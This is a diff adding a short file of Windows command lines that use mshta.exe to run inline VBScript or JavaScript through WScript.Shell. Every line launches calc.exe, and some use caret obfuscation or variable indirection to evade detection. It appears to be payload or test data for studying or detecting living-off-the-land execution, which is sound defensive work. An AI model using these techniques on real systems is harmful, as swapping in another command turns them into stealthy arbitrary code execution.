@@ -1,0 +1,4 @@
+mshta vbscript:CreateObject("WScript.Shell").Run("calc.exe",0)(window.close)
+set a=calc.exe & mshta vbscript:CreateObject("WScript.Shell").Exec("%a%")(window.close)
+set a=calc.exe && mshta javascript:a=new ActiveXObject("WScript.Shell");a.Run("%a%");window.close();
+set a=1 && m^shta vbscript:createobject("WScript.Shell").run("calc.exe")(window.close)
